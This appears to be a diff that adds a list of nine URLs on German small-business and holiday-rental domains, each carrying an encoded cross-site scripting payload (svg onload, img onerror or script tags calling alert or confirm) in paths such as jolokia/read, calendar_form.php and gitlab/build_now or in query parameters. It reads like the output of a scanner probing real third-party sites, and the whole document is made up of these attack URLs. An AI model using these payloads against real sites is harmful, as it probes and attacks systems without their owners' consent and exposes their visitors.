@@ -1,0 +1,9 @@
+http://fashion-lounge24.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://faunistik-landschaftsoekologie.de/calendar_form.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+http://fb-rm.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://feld-hasen-bau.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://feldhofensche-apotheke.de/api/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://feltloom.de/calendar_form.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+https://fenster-dimov.de/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+https://ferienwohnung-holger.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
+https://ferienwohnung-kaeufl.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
